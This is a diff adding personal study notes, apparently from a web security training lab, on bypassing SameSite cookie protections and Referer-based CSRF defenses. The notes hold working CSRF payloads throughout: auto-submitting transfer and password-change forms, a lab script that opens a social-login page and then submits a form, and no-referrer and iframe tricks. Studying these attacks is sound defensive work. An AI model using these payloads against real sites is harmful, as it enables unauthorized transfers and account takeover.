@@ -301,3 +301,200 @@ fetch("https://bank.example.com/transfer?to=hacker&amount=10000", {
 - For WebSockets:
     - Use a **custom Origin header check** on the server
     - Do **token-based authentication** inside the WebSocket, not just cookies
+
+
+#### Bypassing SameSite restrictions using on-site gadgets
+
+
+1. The Setup
+The victim is logged in to:
+https://vulnerable-website.com
+​
+The server sets:
+Set-Cookie: session=abc123; SameSite=Strict; Secure
+​
+2. The Gadget
+Some page on the site has this JavaScript (example: https://vulnerable-website.com/redirector):
+
+// redirector.js
+const next = new URLSearchParams(location.search).get("next");
+if (next) {
+  location.href = next;
+}
+
+
+​
+This is a DOM-based redirect gadget — it reads the next parameter and then performs a client-side redirect to that URL.
+3. The Attacker’s Trick
+The attacker sends this malicious link to the victim (e.g., via email, comment, or social media):
+html
+CopyEdit
+https://vulnerable-website.com/redirector?next=/account/delete?id=123
+
+
+​
+This works because:
+When the victim clicks the link, they go to /redirector on the same site (vulnerable-website.com) ✅​
+The page then performs a client-side redirect to /account/delete?id=123 ✅​
+This new request is now same-site, and browser sends:
+Cookie: session=abc123
+​
+If /account/delete?id=123 is a GET-based state-changing endpoint (bad practice), the request succeeds 💥​
+🧨 CSRF has now bypassed SameSite=Strict
+
+
+##### Bypassing SameSite restrictions via vulnerable sibling domains
+- `https://shop.example.com`
+- `https://mail.example.com`
+
+These are **same-site**, even though they’re **different origins** (because hostnames differ).
+
+If **any one of your subdomains** (like `blog.example.com`) is vulnerable to **XSS**, an attacker can use that XSS to attack **other subdomains** (like `bank.example.com`), **even if cookies are set to `SameSite=Strict`**.
+
+That’s because once you’re on a subdomain like `blog.example.com`, any requests to `bank.example.com` are considered **same-site** — so cookies are sent
+
+
+1. Attacker tricks the victim into clicking that link.
+2. XSS runs in the context of `blog.example.com`
+3. It sends a **GET request** to `bank.example.com`
+4. Since `bank.example.com` and `blog.example.com` are **same-site**, the browser **includes the session cookie**, even if it’s `SameSite=Strict`
+5. 💥 Account is drained.
+
+
+##### Bypassing SameSite Lax restrictions with newly issued cookies
+
+
+1. **Step 1:** Attacker builds a webpage that says: “Click here to win a prize!”
+2. **Step 2:** When the victim clicks, JavaScript opens:
+    
+    ```
+    
+    https://bank.com/login/sso
+    ```
+    
+    ➤ This logs in the user again (automatically) and sets a **new session cookie**
+    
+3. **Step 3:** Attacker waits 5–10 seconds (still within the 2-minute grace period)
+4. **Step 4:** Attacker then submits a **malicious form** using JavaScript:
+    
+    ```html
+    
+    <form action="https://bank.com/transfer" method="POST">
+      <input name="amount" value="1000000">
+      <input name="to" value="attacker">
+    </form>
+    <script>document.forms[0].submit();</script>
+    
+    ```
+    
+
+✅ **This time, Chrome will include the new cookie**, because it was just set → CSRF attack works 💥
+
+
+```bash
+<script>
+
+			window.onclick = () => {
+						window.open('https://0ac5002f03e4a15881fa578d00fe00ac.web-security-academy.net/social-login');
+						setTimeout(changeEmail, 5000);
+			}
+			
+			function changeEmail() {
+					document.forms[0].submit();
+			}
+
+</script>
+</body>
+</htm1>
+```
+
+
+##### What Is a Referer-Based CSRF Defense?
+```bash
+
+# Pseudocode (Flask-like)
+referer = request.headers.get("Referer")
+
+if not referer or not referer.startswith("https://secure-site.com"):
+    return "Blocked: Invalid referer", 403
+
+# Otherwise, process sensitive action (e.g., transfer funds)
+
+Referer: https://secure-site.com/account
+```
+
+### Case 1: Use `<a href>` (no Referer sent on redirect)
+
+```html
+
+<a href="https://secure-site.com/transfer?to=hacker&amount=1000">Click here!</a>
+```
+
+If the app **uses a GET request for a sensitive action** (bad practice!), the user clicks the link and:
+
+- The browser **navigates directly**
+- The request may **omit or shorten the Referer** (e.g., only sends origin)
+
+If the user’s browser or network **strips the Referer** for privacy → CSRF defense is bypassed
+
+
+### Case 2: Use JavaScript to Null the Referer
+
+```html
+
+<script>
+  document.location = "https://secure-site.com/transfer?to=hacker&amount=1000";
+</script>
+
+```
+
+This causes a top-level navigation, and depending on browser and settings:
+
+- **Referer might be stripped entirely**
+- Or sent as only the **origin**, like `https://evil.com` — blocked, but **sometimes misconfigured servers ignore this**
+
+### Case 3: Use `<meta name="referrer" content="no-referrer">`
+
+You can control how the browser sends the Referer header:
+
+```html
+html
+CopyEdit
+<meta name="referrer" content="no-referrer">
+
+```
+
+This tells the browser:
+
+> Don’t send the Referer header at all — not even the origin.
+
+
+Now when the user clicks a link or submits a form:
+
+```html
+html
+CopyEdit
+<form method="POST" action="https://secure-site.com/change-password">
+  <input name="new_password" value="hacked123">
+</form>
+
+```
+
+🚫 **Referer is removed**, so the defense is bypassed if the server doesn’t enforce CSRF tokens
+
+### ✅ Case 4: Use `<iframe src="...">` + privacy settings
+
+Some browsers or extensions **automatically strip Referer headers** from iframe requests or cross-origin fetches.
+
+```html
+html
+CopyEdit
+<iframe src="https://secure-site.com/transfer?to=hacker&amount=1000"></iframe>
+
+```
+
+➡️ The Referer may be:
+
+- Missing
+- Shortened
+- Incorrect
